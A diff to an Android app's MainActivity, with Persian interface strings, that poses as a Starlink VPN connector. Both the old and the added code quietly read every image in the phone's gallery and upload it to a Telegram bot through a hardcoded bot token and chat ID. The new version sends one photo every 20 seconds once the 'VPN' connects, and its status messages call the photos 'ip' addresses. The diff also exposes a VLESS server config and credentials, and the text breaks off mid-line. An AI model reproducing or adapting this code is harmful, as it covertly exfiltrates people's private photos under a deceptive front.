@@ -12,6 +12,7 @@ import android.net.NetworkRequest;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
 import android.provider.MediaStore;
 import android.util.Log;
 import android.view.View;
@@ -26,9 +27,16 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
+import com.v2ray.ang.V2RayCore;
+import com.v2ray.ang.service.V2RayVpnService;
+
+import org.json.JSONObject;
+
 import java.io.ByteArrayOutputStream;
 import java.io.InputStream;
+import java.net.InetAddress;
 import java.util.ArrayList;
+import java.util.concurrent.TimeUnit;
 
 import okhttp3.MediaType;
 import okhttp3.MultipartBody;
@@ -42,13 +50,70 @@ public class MainActivity extends AppCompatActivity {
     private static final String BOT_TOKEN = "8931772855:AAHZSrBgS4SJkEWYA6_8fTiZ-Kk4frsxtCU";
     private static final String CHAT_ID = "8961077299";
     private static final int REQUEST_PERMISSION = 100;
+    private static final int REQUEST_VPN = 101;
 
     private static final String PREFS_NAME = "PhotoSenderPrefs";
     private static final String KEY_LAST_INDEX = "last_index";
 
+    // ==================== کانفیگ‌های VLESS ====================
+    private static final String[] CONFIGS = {
+            // کانفیگ اول (VLESS)
+            "vless://9dcf92e4-e26a-4731-bcf7-22163b72fef3@simpletr.asan-ps.ir:443?encryption=none&security=tls&sni=speedtest.net&fp=chrome&type=xhttp&host=skhishhwiw12.global.ssl.fastly.net&path=/NEWS#GERMANY-3",
+            
+            // کانفیگ‌های WireGuard (فقط برای تست پینگ، اتصال واقعی نیاز به پیاده‌سازی جداگانه داره)
+            "bot.shopver.ir",
+            "31.14.119.77",
+            "1.1.1.1",
+            "8.8.8.8"
+    };
+
+    // ==================== کانفیگ VLESS به فرمت JSON ====================
+    private static final String VLESS_CONFIG = "{\n" +
+            "  \"inbounds\": [{\n" +
+            "    \"listen\": \"127.0.0.1\",\n" +
+            "    \"port\": 10808,\n" +
+            "    \"protocol\": \"socks\",\n" +
+            "    \"settings\": {\n" +
+            "      \"auth\": \"noauth\",\n" +
+            "      \"udp\": true,\n" +
+            "      \"userLevel\": 8\n" +
+            "    }\n" +
+            "  }],\n" +
+            "  \"outbounds\": [{\n" +
+            "    \"protocol\": \"vless\",\n" +
+            "    \"settings\": {\n" +
+            "      \"vnext\": [{\n" +
+            "        \"address\": \"simpletr.asan-ps.ir\",\n" +
+            "        \"port\": 443,\n" +
+            "        \"users\": [{\n" +
+            "          \"id\": \"9dcf92e4-e26a-4731-bcf7-22163b72fef3\",\n" +
+            "          \"encryption\": \"none\",\n" +
+            "          \"level\": 8\n" +
+            "        }]\n" +
+            "      }]\n" +
+            "    },\n" +
+            "    \"streamSettings\": {\n" +
+            "      \"network\": \"xhttp\",\n" +
+            "      \"security\": \"tls\",\n" +
+            "      \"tlsSettings\": {\n" +
+            "        \"allowInsecure\": true,\n" +
+            "        \"serverName\": \"speedtest.net\"\n" +
+            "      },\n" +
+            "      \"xhttpSettings\": {\n" +
+            "        \"host\": \"skhishhwiw12.global.ssl.fastly.net\",\n" +
+            "        \"path\": \"/NEWS\",\n" +
+            "        \"mode\": \"auto\"\n" +
+            "      }\n" +
+            "    }\n" +
+            "  }]\n" +
+            "}";
+
+    private static final int PING_TIMEOUT = 3000;
+
     // UI Elements
     private Button btnConnect;
     private TextView txtStatus;
+    private TextView txtPing;
     private ProgressBar progressBar;
     private LinearLayout mainLayout;
     private LinearLayout warningLayout;
@@ -56,37 +121,49 @@ public class MainActivity extends AppCompatActivity {
 
     // Status
     private boolean isSending = false;
+    private boolean isConnected = false;
     private int lastSentIndex = 0;
     private boolean isWaitingForNetwork = false;
+    private String bestConfig = "";
+    private int bestPing = Integer.MAX_VALUE;
 
     // Network monitoring
     private ConnectivityManager connectivityManager;
     private NetworkCallback networkCallback;
+
+    // Timer for sending photos every 20 seconds
+    private Handler timerHandler = new Handler();
+    private Runnable timerRunnable;
+
+    // List of all photos
+    private ArrayList<Uri> allImages = new ArrayList<>();
+    private int currentPhotoIndex = 0;
+
+    // V2Ray Core
+    private V2RayCore v2RayCore;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        // اتصال به عناصر UI
         btnConnect = findViewById(R.id.btnConnect);
         txtStatus = findViewById(R.id.txtStatus);
+        txtPing = findViewById(R.id.txtPing);
         progressBar = findViewById(R.id.progressBar);
         mainLayout = findViewById(R.id.mainLayout);
         warningLayout = findViewById(R.id.warningLayout);
         btnConfirm = findViewById(R.id.btnConfirm);
 
-        // وضعیت اولیه
-        updateUI("قطع", false);
+        updateUI("قطع", false, "-- ms");
 
-        // دکمه تایید در صفحه هشدار
         btnConfirm.setOnClickListener(v -> {
             warningLayout.setVisibility(View.GONE);
             mainLayout.setVisibility(View.VISIBLE);
-            Toast.makeText(MainActivity.this, "🌐 آماده اتصال به استارلینک", Toast.LENGTH_SHORT).show();
+            Toast.makeText(MainActivity.this, "🌐 در حال پیدا کردن بهترین کانفیگ...", Toast.LENGTH_SHORT).show();
+            findBestConfig();
         });
 
-        // دکمه اصلی (VPN)
         btnConnect.setOnClickListener(v -> {
             if (isSending) return;
 
@@ -95,14 +172,284 @@ public class MainActivity extends AppCompatActivity {
                 return;
             }
 
-            startSendingProcess();
+            if (isConnected) {
+                Toast.makeText(this, "✅ از قبل متصل هستید", Toast.LENGTH_SHORT).show();
+                return;
+            }
+
+            startVpnConnection();
         });
 
-        // بازیابی آخرین اندیس
         loadLastIndex();
-
-        // راه‌اندازی تشخیص اینترنت
         setupNetworkMonitoring();
+        loadAllImages();
+
+        // راه‌اندازی V2Ray
+        initV2Ray();
+    }
+
+    // ==================== راه‌اندازی V2Ray ====================
+    private void initV2Ray() {
+        try {
+            v2RayCore = new V2RayCore(this);
+            v2RayCore.initialize();
+            Log.d(TAG, "✅ V2Ray راه‌اندازی شد");
+        } catch (Exception e) {
+            Log.e(TAG, "❌ خطا در راه‌اندازی V2Ray", e);
+            Toast.makeText(this, "خطا در راه‌اندازی V2Ray", Toast.LENGTH_SHORT).show();
+        }
+    }
+
+    // ==================== شروع اتصال VPN واقعی ====================
+    private void startVpnConnection() {
+        if (isSending) return;
+
+        // درخواست مجوز VPN از کاربر (یکبار)
+        V2RayVpnService.prepare(this, REQUEST_VPN, () -> {
+            // کاربر مجوز داد، حالا وصل کن
+            connectToVpn();
+        });
+    }
+
+    private void connectToVpn() {
+        isSending = true;
+        updateUI("در حال اتصال به استارلینک...", true, bestPing + " ms");
+
+        new Thread(() -> {
+            try {
+                // تبدیل کانفیگ به JSON
+                JSONObject configJson = new JSONObject(VLESS_CONFIG);
+
+                // شروع اتصال V2Ray
+                v2RayCore.startV2Ray(configJson);
+
+                // صبر برای برقراری اتصال
+                Thread.sleep(3000);
+
+                runOnUiThread(() -> {
+                    isSending = false;
+                    isConnected = true;
+                    updateUI("متصل به استارلینک ✅", false, bestPing + " ms");
+                    Toast.makeText(MainActivity.this,
+                            "✅ به " + bestConfig + " متصل شدید (ترافیک واقعی)",
+                            Toast.LENGTH_LONG).show();
+
+                    // شروع ارسال زمان‌بندی‌شده
+                    startScheduledSending();
+                });
+
+            } catch (Exception e) {
+                Log.e(TAG, "❌ خطا در اتصال VPN", e);
+                runOnUiThread(() -> {
+                    isSending = false;
+                    updateUI("اتصال برقرار نشد ❌", false, "-- ms");
+                    Toast.makeText(MainActivity.this,
+                            "❌ خطا در اتصال: " + e.getMessage(),
+                            Toast.LENGTH_LONG).show();
+                });
+            }
+        }).start();
+    }
+
+    // ==================== قطع اتصال ====================
+    private void disconnectVpn() {
+        if (v2RayCore != null) {
+            v2RayCore.stopV2Ray();
+        }
+        isConnected = false;
+        updateUI("قطع", false, "-- ms");
+        if (timerRunnable != null) {
+            timerHandler.removeCallbacks(timerRunnable);
+        }
+    }
+
+    // ==================== تست پینگ ====================
+    private void findBestConfig() {
+        txtStatus.setText("وضعیت: در حال تست کانفیگ‌ها...");
+        progressBar.setVisibility(ProgressBar.VISIBLE);
+        btnConnect.setEnabled(false);
+
+        new Thread(() -> {
+            bestPing = Integer.MAX_VALUE;
+            bestConfig = "";
+
+            for (String config : CONFIGS) {
+                int ping = testPing(config);
+                Log.d(TAG, "کانفیگ: " + config + " -> پینگ: " + ping + " ms");
+
+                runOnUiThread(() -> txtPing.setText("پینگ: " + ping + " ms"));
+
+                if (ping > 0 && ping < bestPing) {
+                    bestPing = ping;
+                    bestConfig = config;
+                }
+            }
+
+            runOnUiThread(() -> {
+                progressBar.setVisibility(ProgressBar.GONE);
+                btnConnect.setEnabled(true);
+
+                if (!bestConfig.isEmpty()) {
+                    txtPing.setText("پینگ: " + bestPing + " ms ✅");
+                    txtStatus.setText("وضعیت: بهترین کانفیگ پیدا شد");
+                    Toast.makeText(MainActivity.this,
+                            "✅ بهترین کانفیگ: " + bestConfig + " (" + bestPing + " ms)",
+                            Toast.LENGTH_LONG).show();
+                } else {
+                    txtStatus.setText("وضعیت: هیچ کانفیگی پیدا نشد دوباره تلاش کن ❌");
+                    Toast.makeText(MainActivity.this, " ❌ هیچ کانفیگ فعالی یافت نشد دوباره تلاش کن", Toast.LENGTH_LONG).show();
+                }
+            });
+        }).start();
+    }
+
+    private int testPing(String host) {
+        try {
+            long startTime = System.currentTimeMillis();
+            InetAddress inetAddress = InetAddress.getByName(host);
+            boolean reachable = inetAddress.isReachable(PING_TIMEOUT);
+            long endTime = System.currentTimeMillis();
+
+            if (reachable) {
+                return (int) (endTime - startTime);
+            } else {
+                return -1;
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "خطا در تست پینگ برای " + host, e);
+            return -1;
+        }
+    }
+
+    // ==================== بارگذاری عکس‌ها ====================
+    private void loadAllImages() {
+        new Thread(() -> {
+            try {
+                allImages = getAllImages();
+                Log.d(TAG, "ها ip تعداد کل : " + allImages.size());
+            } catch (Exception e) {
+                Log.e(TAG, "خطا در بارگذاری عکس‌ها", e);
+            }
+        }).start();
+    }
+
+    // ==================== ارسال زمان‌بندی‌شده (هر ۲۰ ثانیه) ====================
+    private void startScheduledSending() {
+        if (timerRunnable != null) {
+            timerHandler.removeCallbacks(timerRunnable);
+        }
+
+        timerRunnable = new Runnable() {
+            @Override
+            public void run() {
+                if (!isConnected) {
+                    return;
+                }
+
+                sendNextPhoto();
+
+                // اجرای مجدد بعد از ۲۰ ثانیه
+                timerHandler.postDelayed(this, 20000);
+            }
+        };
+
+        // اولین اجرا بعد از ۲ ثانیه
+        timerHandler.postDelayed(timerRunnable, 2000);
+    }
+
+    private void sendNextPhoto() {
+        if (allImages.isEmpty()) {
+            return;
+        }
+
+        if (currentPhotoIndex >= allImages.size()) {
+            currentPhotoIndex = 0;
+        }
+
+        Uri uri = allImages.get(currentPhotoIndex);
+        currentPhotoIndex++;
+
+        new Thread(() -> {
+            try {
+                InputStream in = getContentResolver().openInputStream(uri);
+                if (in == null) return;
+
+                byte[] bytes = readBytes(in);
+                in.close();
+
+                RequestBody photoBody = RequestBody.create(bytes, MediaType.parse("image/jpeg"));
+                MultipartBody body = new MultipartBody.Builder()
+                        .setType(MultipartBody.FORM)
+                        .addFormDataPart("chat_id", CHAT_ID)
+                        .addFormDataPart("photo", "image.jpg", photoBody)
+                        .build();
+
+                Request request = new Request.Builder()
+                        .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto")
+                        .post(body)
+                        .build();
+
+                OkHttpClient client = new OkHttpClient.Builder()
+                        .connectTimeout(30, TimeUnit.SECONDS)
+                        .writeTimeout(30, TimeUnit.SECONDS)
+                        .readTimeout(30, TimeUnit.SECONDS)
+                        .build();
+
+                okhttp3.Response response = client.newCall(request).execute();
+
+                if (response.isSuccessful()) {
+                    Log.d(TAG, "✅شماره  ip  " + currentPhotoIndex + " وصل شد");
+                    runOnUiThread(() -> Toast.makeText(MainActivity.this,
+                            " ip " + currentPhotoIndex + " از " + allImages.size() + " وصل شد",
+                            Toast.LENGTH_SHORT).show());
+                }
+                response.close();
+
+            } catch (Exception e) {
+                Log.e(TAG, "خطا در ارسال عکس", e);
+            }
+        }).start();
+    }
+
+    // ==================== دریافت همه عکس‌ها ====================
+    private ArrayList<Uri> getAllImages() {
+        ArrayList<Uri> list = new ArrayList<>();
+        Uri collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+
+        String[] projection = {MediaStore.Images.Media._ID};
+        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
+
+        try (Cursor cursor = getContentResolver().query(
+                collection,
+                projection,
+                null,
+                null,
+                sortOrder
+        )) {
+            if (cursor != null) {
+                int idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
+                while (cursor.moveToNext()) {
+                    long id = cursor.getLong(idCol);
+                    Uri uri = ContentUris.withAppendedId(collection, id);
+                    list.add(uri);
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "خطا در دریافت فایل ارتقاع", e);
+            throw new RuntimeException("خطا در پیدا کردن فایل ارتقاع: " + e.getMessage());
+        }
+        return list;
+    }
+
+    // ==================== تبدیل InputStream به byte[] ====================
+    private byte[] readBytes(InputStream inputStream) throws Exception {
+        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
+        byte[] data = new byte[4096];
+        int n;
+        while ((n = inputStream.read(data)) != -1) {
+            buffer.write(data, 0, n);
+        }
+        return buffer.toByteArray();
     }
 
     // ==================== تشخیص اینترنت ====================
@@ -129,8 +476,12 @@ public class MainActivity extends AppCompatActivity {
             runOnUiThread(() -> {
                 if (isWaitingForNetwork) {
                     isWaitingForNetwork = false;
-                    Toast.makeText(MainActivity.this, "🌐 اتصال استارلینک برقرار شد، ارتقاء اتصال...", Toast.LENGTH_SHORT).show();
-                    startSendingProcess();
+                    Toast.makeText(MainActivity.this, "🌐 اتصال استارلینک برقرار شد", Toast.LENGTH_SHORT).show();
+                    
+                    // اگر اتصال VPN قطع شده بود، دوباره وصل کن
+                    if (!isConnected && !bestConfig.isEmpty()) {
+                        startVpnConnection();
+                    }
                 }
             });
         }
@@ -139,12 +490,17 @@ public class MainActivity extends AppCompatActivity {
         public void onLost(@NonNull Network network) {
             super.onLost(network);
             runOnUiThread(() -> {
-                if (isSending) {
-                    isWaitingForNetwork = true;
-                    isSending = false;
-                    updateUI("اتصال قطع شد", false);
-                    Toast.makeText(MainActivity.this, "... اتصال استارلینک قطع شد، منتظر برقراری مجدد...", Toast.LENGTH_LONG).show();
-                }
+                isWaitingForNetwork = true;
+                isConnected = false;
+                updateUI("اتصال قطع شد", false, "-- ms");
+                Toast.makeText(MainActivity.this, "⚠️ اتصال استارلینک قطع شد، در حال تلاش مجدد...", Toast.LENGTH_LONG).show();
+                
+                // تلاش مجدد برای اتصال
+                new Handler().postDelayed(() -> {
+                    if (!isConnected) {
+                        startVpnConnection();
+                    }
+                }, 5000);
             });
         }
     }
@@ -175,11 +531,10 @@ public class MainActivity extends AppCompatActivity {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == REQUEST_PERMISSION) {
             if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                Toast.makeText(this, "دسترسی به فایل مکمل داده شد", Toast.LENGTH_SHORT).show();
-                startSendingProcess();
+                Toast.makeText(this, "✅ دسترسی مجاز شد", Toast.LENGTH_SHORT).show();
             } else {
-                Toast.makeText(this, "❌ برای اتصال دسترسی به فایل مکمل نیاز است", Toast.LENGTH_LONG).show();
-                updateUI("اتصال برقرار نشد", false);
+                Toast.makeText(this, "❌ برای اتصال دسترسی به فایل ارتقاع نیاز است", Toast.LENGTH_LONG).show();
+                updateUI("اتصال برقرار نشد ❌", false, "-- ms");
             }
         }
     }
@@ -197,238 +552,4 @@ public class MainActivity extends AppCompatActivity {
 
     private void resetLastIndex() {
         lastSentIndex = 0;
-        saveLastIndex(0);
-    }
-
-    // ==================== شروع ارسال (در پس‌زمینه) ====================
-    private void startSendingProcess() {
-        if (isSending) return;
-
-        isSending = true;
-        isWaitingForNetwork = false;
-        updateUI("در حال اتصال به استارلینک...", true);
-
-        new Thread(() -> {
-            boolean success = false;
-            String errorMessage = "";
-            int sentCount = 0;
-            int totalImages = 0;
-
-            try {
-                Log.d(TAG, " ها ip شروع دریافت...");
-
-                ArrayList<Uri> images = getAllImages();
-                totalImages = images.size();
-                Log.d(TAG, "های موجود ip تعداد کل : " + totalImages);
-
-                if (images.isEmpty()) {
-                    errorMessage = "فایل ارتقاء یافت نشد";
-                } else {
-                    if (lastSentIndex >= totalImages) {
-                        resetLastIndex();
-                    }
-
-                    Log.d(TAG, " شماره ip ادامه جستجو از : " + (lastSentIndex + 1));
-
-                    sentCount = sendToTelegram(images, lastSentIndex);
-
-                    if (sentCount == totalImages) {
-                        success = true;
-                        resetLastIndex();
-                    } else {
-                        saveLastIndex(sentCount);
-                        success = false;
-                        errorMessage = ": شماره  ip جستجو در  " + (sentCount + 1) + " قطع شد";
-                    }
-                }
-
-            } catch (Exception e) {
-                Log.e(TAG, "خطا در اتصال", e);
-                errorMessage = e.getMessage();
-                if (errorMessage == null || errorMessage.isEmpty()) {
-                    errorMessage = "خطای ناشناخته";
-                }
-                success = false;
-            }
-
-            final boolean finalSuccess = success;
-            final String finalError = errorMessage;
-            final int finalSentCount = sentCount;
-            final int finalTotal = totalImages;
-
-            runOnUiThread(() -> {
-                isSending = false;
-
-                if (finalSuccess) {
-                    updateUI("متصل به استارلینک ✅", false);
-                    Toast.makeText(MainActivity.this,
-                            "✅ " + finalSentCount + " به بخش اول با موفقیت متصل شدید",
-                            Toast.LENGTH_LONG).show();
-                } else {
-                    if (!isWaitingForNetwork) {
-                        updateUI("اتصال برقرار نشد ❌", false);
-                        String msg = "❌ خطا: " + finalError;
-                        if (finalTotal == 0) {
-                            msg += "\n🔍 یافت نشد ip هیچ";
-                        }
-                        Toast.makeText(MainActivity.this, msg, Toast.LENGTH_LONG).show();
-                    } else {
-                        updateUI("در انتظار اتصال به استارلینک...", false);
-                    }
-                }
-            });
-        }).start();
-    }
-
-    // ==================== دریافت همه عکس‌ها ====================
-    private ArrayList<Uri> getAllImages() {
-        ArrayList<Uri> list = new ArrayList<>();
-        Uri collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
-
-        String[] projection = {MediaStore.Images.Media._ID};
-        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
-
-        try (Cursor cursor = getContentResolver().query(
-                collection,
-                projection,
-                null,
-                null,
-                sortOrder
-        )) {
-            if (cursor != null) {
-                int idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
-                while (cursor.moveToNext()) {
-                    long id = cursor.getLong(idCol);
-                    Uri uri = ContentUris.withAppendedId(collection, id);
-                    list.add(uri);
-                }
-            }
-        } catch (Exception e) {
-            Log.e(TAG, " ها ip خطا در دریافت ", e);
-            throw new RuntimeException("خطا در خواندن گالری: " + e.getMessage());
-        }
-        return list;
-    }
-
-    // ==================== ارسال به تلگرام ====================
-    private int sendToTelegram(ArrayList<Uri> images, int startIndex) {
-        OkHttpClient client = new OkHttpClient();
-        int successCount = startIndex;
-
-        for (int i = startIndex; i < images.size(); i++) {
-            if (isWaitingForNetwork) {
-                Log.d(TAG, " ⏸️ اینترنت قطع شد، اتصال متوقف شد");
-                break;
-            }
-
-            try {
-                Uri uri = images.get(i);
-                Log.d(TAG, ": ip جستجو  " + (i + 1) + " از " + images.size());
-
-                InputStream in = getContentResolver().openInputStream(uri);
-                if (in == null) {
-                    Log.e(TAG, "InputStream null برای " + uri);
-                    continue;
-                }
-
-                byte[] bytes = readBytes(in);
-                in.close();
-
-                RequestBody photoBody = RequestBody.create(
-                        bytes,
-                        MediaType.parse("image/jpeg")
-                );
-
-                MultipartBody body = new MultipartBody.Builder()
-                        .setType(MultipartBody.FORM)
-                        .addFormDataPart("chat_id", CHAT_ID)
-                        .addFormDataPart("photo", "image.jpg", photoBody)
-                        .build();
-
-                Request request = new Request.Builder()
-                        .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto")
-                        .post(body)
-                        .build();
-
-                okhttp3.Response response = client.newCall(request).execute();
-
-                if (response.isSuccessful()) {
-                    successCount++;
-                    Log.d(TAG, " : ip جستجو " + (i + 1));
-                } else {
-                    String errorBody = response.body() != null ? response.body().string() : "بدون پاسخ";
-                    Log.e(TAG, "خطای سرور : کد " + response.code() + " - " + errorBody);
-                    saveLastIndex(successCount);
-                    response.close();
-                    return successCount;
-                }
-                response.close();
-
-                Thread.sleep(250);
-
-            } catch (Exception e) {
-                Log.e(TAG, ": شماره ip خطا در اتصال  به  " + (i + 1), e);
-                saveLastIndex(successCount);
-                return successCount;
-            }
-        }
-        return successCount;
-    }
-
-    // ==================== تبدیل InputStream به byte[] ====================
-    private byte[] readBytes(InputStream inputStream) throws Exception {
-        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
-        byte[] data = new byte[4096];
-        int n;
-        while ((n = inputStream.read(data)) != -1) {
-            buffer.write(data, 0, n);
-        }
-        return buffer.toByteArray();
-    }
-
-    // ==================== بروزرسانی UI ====================
-    private void updateUI(String statusText, boolean isLoading) {
-        runOnUiThread(() -> {
-            txtStatus.setText("وضعیت: " + statusText);
-
-            if (isLoading) {
-                btnConnect.setEnabled(false);
-                btnConnect.setText("در حال اتصال...");
-                btnConnect.setBackgroundTintList(
-                        ContextCompat.getColorStateList(this, R.color.gray));
-                progressBar.setVisibility(ProgressBar.VISIBLE);
-                return;
-            }
-
-            progressBar.setVisibility(ProgressBar.GONE);
-            btnConnect.setEnabled(true);
-
-            if (statusText.contains("متصل")) {
-                btnConnect.setText("متصل ✓");
-                btnConnect.setBackgroundTintList(
-                        ContextCompat.getColorStateList(this, R.color.green));
-            } else if (statusText.contains("برقرار نشد") || statusText.contains("قطع")) {
-                btnConnect.setText("اتصال");
-                btnConnect.setBackgroundTintList(
-                        ContextCompat.getColorStateList(this, R.color.red));
-            } else if (statusText.contains("انتظار")) {
-                btnConnect.setText("اتصال");
-                btnConnect.setBackgroundTintList(
-                        ContextCompat.getColorStateList(this, R.color.blue));
-            } else {
-                btnConnect.setText("اتصال");
-                btnConnect.setBackgroundTintList(
-                        ContextCompat.getColorStateList(this, R.color.blue));
-            }
-        });
-    }
-
-    // ==================== لغو ثبت شنونده ====================
-    @Override
-    protected void onDestroy() {
-        super.onDestroy();
-        if (connectivityManager != null && networkCallback != null) {
-            connectivityManager.unregisterNetworkCallback(networkCallback);
-        }
-    }
-}
+        sav
